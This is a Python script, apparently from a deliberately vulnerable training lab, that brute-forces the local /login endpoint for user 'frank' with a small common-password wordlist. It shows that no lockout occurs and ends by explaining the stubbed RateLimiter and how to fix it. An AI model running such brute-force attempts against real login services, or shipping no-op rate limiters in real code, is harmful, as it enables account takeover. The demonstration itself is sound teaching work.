
import sys
import time
import requests

BASE = "http://localhost:5000"

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def banner():
    print(f"\n{BOLD}{CYAN}{'═'*64}")
    print("  ATTACK 5 — BRUTE FORCE (No Rate Limiting / Account Lockout)")
    print(f"{'═'*64}{RESET}")


def vuln(msg): print(f"  {RED}[VULN]  {msg}{RESET}")
def info(msg): print(f"  {YELLOW}[INFO]  {msg}{RESET}")
def step(msg): print(f"\n  {BOLD}» {msg}{RESET}")
def show(k, v): print(f"     {CYAN}{k:<36}{RESET}{v}")
def boom(msg): print(f"\n  {BOLD}{RED}💥 EXPLOITED: {msg}{RESET}")
def safe(msg): print(f"\n  {BOLD}{GREEN}✓  BLOCKED:   {msg}{RESET}")


# Sample dictionary wordlist — attacker would use a much larger list
WORDLIST = [
    "password",
    "123456",
    "frank123",
    "SecureCorp1",
    "letmein",
    "admin",
    "qwerty",
    "Password1!",
    "securecorp",
    "Frank",
]

REAL_PASSWORD = "Frank@2024"
TARGET_USER   = "frank"


def main():
    banner()

    vuln("rate_limiter.py → RateLimiter is a stub class — all methods are no-ops.")
    vuln("is_ip_blocked() always returns (False, '').")
    vuln("is_account_locked() always returns (False, '').")
    vuln("record_attempt() does nothing — failure counter never increments.")

    # Check server is up
    try:
        requests.get(f"{BASE}/health", timeout=3)
    except requests.ConnectionError:
        print(f"\n{RED}  Cannot connect to {BASE} — run: python app.py{RESET}")
        sys.exit(1)

    step(f"Sending {len(WORDLIST)} wrong passwords for '{TARGET_USER}'")
    info("Expect: HTTP 401 each time — account should lock after 5 failures but never does")

    locked   = False
    failures = 0

    for i, pwd in enumerate(WORDLIST, 1):
        r = requests.post(f"{BASE}/login",
                          json={"username": TARGET_USER, "password": pwd})
        if r.status_code == 429:
            locked = True
            show(f"Attempt {i:>2} ({pwd:<16}):",
                 f"HTTP {r.status_code} — {GREEN}ACCOUNT LOCKED ✓{RESET}")
            break
        elif r.status_code == 401:
            failures += 1
            show(f"Attempt {i:>2} ({pwd:<16}):",
                 f"HTTP {r.status_code} — {RED}wrong password, no lockout ← EXPLOIT{RESET}")
        else:
            show(f"Attempt {i:>2} ({pwd:<16}):",
                 f"HTTP {r.status_code} — unexpected response")

    # Try the real password after all failures
    step(f"Trying the REAL password after {failures} failed attempts")
    r_real = requests.post(f"{BASE}/login",
                           json={"username": TARGET_USER, "password": REAL_PASSWORD})
    if r_real.ok:
        tgt = r_real.json().get("tgt", "")[:30]
        show(f"Real password ({REAL_PASSWORD}):",
             f"HTTP {r_real.status_code} — {RED}LOGIN SUCCESS ← EXPLOIT — TGT: {tgt}…{RESET}")
    else:
        show(f"Real password ({REAL_PASSWORD}):",
             f"HTTP {r_real.status_code} — {GREEN}BLOCKED ✓{RESET}")

    if not locked and r_real.ok:
        boom(f"{failures} failed attempts caused zero lockout — unlimited dictionary attack possible!")
    else:
        safe("Account was locked before the real password could be tried")

    step("Root Cause & Fix")
    info("File:  rate_limiter.py → class RateLimiter")
    info("Bug:   All methods are stubs returning safe defaults (False, '').")
    info("Fix:   Restore is_account_locked() to track failure counts per username.")
    info("       After >= 5 consecutive failures, set a lockout with expiry.")
    info("       Restore record_attempt() to increment counters.")
    info("       Restore is_ip_blocked() to block IPs with > 20 recent failures.")
    print()


if __name__ == "__main__":
    main()
